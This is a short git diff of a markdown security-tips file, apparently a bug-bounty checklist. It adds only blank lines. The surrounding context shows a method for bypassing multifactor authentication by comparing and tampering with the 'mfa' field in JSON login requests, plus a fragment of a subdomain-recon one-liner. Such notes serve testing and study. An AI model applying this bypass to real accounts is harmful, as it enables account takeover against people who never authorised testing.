@@ -39,6 +39,7 @@ cat domain.txt | assetfinder --subs-only | httprobe | while read url; do xml=$(c
 ## Bypass Multifactor Authentication
 1. Notice both the request while login when 2FA is enabled and disabled
 2. While 2FA is Disabled :
+
 **Request**
 ```json
 {"email":"abc@mail.com","pass":"password","mfa":null,"code":""}
@@ -48,6 +49,7 @@ cat domain.txt | assetfinder --subs-only | httprobe | while read url; do xml=$(c
 Location : https://abc.com/user/dashboard 
 ```
 3. While 2FA is Enabled :
+
 **Resuest**
 ```json
 {"email":"abc@mail.com","pass":"password","mfa":true,"code":""}
